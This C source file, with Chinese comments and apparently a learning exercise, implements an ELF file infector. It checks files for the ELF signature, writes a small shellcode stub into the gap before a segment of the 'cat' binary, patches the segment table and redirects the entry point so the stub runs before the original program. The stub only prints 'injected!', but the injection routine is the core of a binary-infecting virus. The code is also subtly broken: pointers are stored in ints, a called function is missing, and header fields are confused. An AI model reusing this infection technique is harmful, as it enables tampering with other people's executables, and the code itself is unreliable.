#include "stdio.h"
#include "string.h"
#include <elf.h>
int find_function(char *filename, char *function_name);
int is_ELF(char *filename)
{
    int fd = open(filename, O_RDWR);
    // printf("fd == %d\n", fd);
    if (fd == -1)
    {
        printf("no such file: %s\n", filename);
        return 0;
    }
    char head[4];
    read(fd, head, 0x4);
    close(fd);
    return memcmp(head, "\x7f\x45\x4c\x46", 4) == 0;
}
void inject(filename)
{

    char shellcode[0x100];
    int i;
    int fd = open(filename, O_RDWR);
    if (fd < 0)
        return printf("open error!\n");
    char buffer[0x3000];
    read(fd, buffer, 0x3000);

    // 保存程序原先的入口地址
    int start;
    memcpy(&start, buffer + 24, 4);
    printf("start_addr at : 0x%x\n", start);

    // 寻找代码段
    int s_off;
    memcpy(&s_off, buffer + 32, 4);
    // 每个段描述符的长度是40个字节
    // text一般是第二个段
    printf("seg_off in file: %d\n", s_off);
    int seg_text = buffer + s_off + 40;
    int sh_addr, seg_offset, seg_size;
    memcpy(&sh_addr, seg_text + 12, 4);    // 段映射的虚拟地址
    memcpy(&seg_offset, seg_text + 16, 4); // 段在文件中的偏移
    memcpy(&seg_size, seg_text + 20, 4);   // 段的长度
    printf("seg_offset == %d\nseg_size == %d\n", seg_offset, seg_size);
    int code_start = start - sh_addr + seg_offset; // 代码在文件中的起始地址
    printf("code_start == %d\n", code_start);

    int printf_addr = find_function(filename, "printf");
    memcpy(shellcode, "\xe8\x0a\x00\x00\x00", 5);
    memcpy(shellcode + 5, "injected!\x00", 10);
    memcpy(shellcode + 15, "h", 1);
    memcpy(shellcode + 16, &start, 4); // push ret_addr
    memcpy(shellcode + 20, "h", 1);
    memcpy(shellcode + 21, &printf_addr, 4); // push &printf
    memcpy(shellcode + 25, "\xc3", 1);       // ret

    for (i = 0; i < sizeof(shellcode); i++)
    {
        if (*(buffer + seg_offset - i - 1) != 0)
            break;
    }
    if (i != sizeof(shellcode))
        return printf("cannot inject!\n");
    printf("inject is ok!\n");
    memcpy(buffer + seg_offset - sizeof(shellcode), shellcode, sizeof(shellcode));
    printf("inject offset == 0x%x\n", seg_offset - sizeof(shellcode));

    // new_seg_start 就是新代码段在文件中的偏移，也是新的程序入口点
    int new_seg_start = seg_offset - sizeof(shellcode);

    // 改写text段表
    seg_offset -= sizeof(shellcode);
    seg_size += sizeof(shellcode);
    sh_addr = seg_offset - sizeof(shellcode);
    memcpy(seg_text + 12, &sh_addr, 4);
    memcpy(seg_text + 16, &seg_offset, 4);
    memcpy(seg_text + 20, &seg_size, 4);
    memcpy(seg_text + 32, "\x00\x00\x00\x00", 4);

    // 修改程序入口地址
    printf("new_seg_start == 0x%x\n", new_seg_start);
    memcpy(buffer + 24, &new_seg_start, 4);

    close(fd);
    fd = open(filename, O_RDWR);
    int len = write(fd, buffer, sizeof(buffer));
    printf("inject length == %d\n", len);
    close(fd);
}

int main()
{
    char *res = test_ls();
    char filename[0x30];
    char *pointer = res + 4 + 37;
    int cnt;
    while (*pointer != 0)
    {
        cnt = 0;
        do
        {
            pointer++;
            cnt++;
        } while (*pointer != ' ' && *pointer != 0);
        memcpy(filename, pointer - cnt, cnt);
        filename[cnt] = 0;
        int check_elf = is_ELF(filename + 1);
        if (check_elf == 1)
            printf("file %s is ELF\n", filename);
        else
            printf("file %s is not ELF\n", filename + 1);
        if (*pointer == 0)
            break;
    }
    inject("cat");
}

int find_function(char *filename, char *function_name)
{
    // 打开二进制文件
    int res = -1;
    int fd = open(filename, O_RDWR);
    if (fd == -1)
    {
        printf("open error");
        return -1;
    }
    // 读取 ELF 头
    Elf32_Ehdr ehdr;
    if (read(fd, &ehdr, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr))
    {
        printf("read error\n");
        close(fd);
        return -1;
        ;
    }

    // 定位到节头表的偏移
    if (lseek(fd, ehdr.e_shoff, SEEK_SET) == -1)
    {
        printf("lseek error\n");
        close(fd);
        return -1;
    }

    // 读取字符串表头
    Elf32_Shdr strtab_hdr;
    if (lseek(fd, ehdr.e_shoff + ehdr.e_shstrndx * sizeof(Elf32_Shdr), SEEK_SET) == -1 ||
        read(fd, &strtab_hdr, sizeof(Elf32_Shdr)) != sizeof(Elf32_Shdr))
    {
        printf("read error\n");
        close(fd);
        return -1;
    }

    // 定位到字符串表的偏移
    if (lseek(fd, strtab_hdr.sh_offset, SEEK_SET) == -1)
    {
        printf("lseek error\n");
        close(fd);
        return -1;
    }

    // 读取字符串表
    char strtab[strtab_hdr.sh_size];
    if (read(fd, strtab, strtab_hdr.sh_size) != strtab_hdr.sh_size)
    {
        printf("read error\n");
        close(fd);
        return -1;
    }

    // 遍历节头表查找符号表
    for (int i = 0; i < ehdr.e_shnum; ++i)
    {
        Elf32_Shdr shdr;
        if (read(fd, &shdr, sizeof(Elf32_Shdr)) != sizeof(Elf32_Shdr))
        {
            printf("read error\n");
            close(fd);
            return -1;
        }

        // 查找符号表
        if (shdr.sh_type == SHT_SYMTAB)
        {
            // 定位到符号表的偏移
            if (lseek(fd, shdr.sh_offset, SEEK_SET) == -1)
            {
                printf("lseek error\n");
                close(fd);
                return -1;
            }

            // 读取符号表
            Elf32_Sym sym;
            while (read(fd, &sym, sizeof(Elf32_Sym)) == sizeof(Elf32_Sym))
            {
                // 查找符号表中的 printf 符号
                if (ELF32_ST_TYPE(sym.st_info) == STT_FUNC &&
                    memcmp(strtab + sym.st_name, function_name, strlen(function_name)) == 0)
                {
                    printf("Found %s function at address: 0x%x\n", function_name, sym.st_value);
                    res = sym.st_value;
                    break;
                }
            }
            break;
        }
    }

    close(fd);
    return res;
}
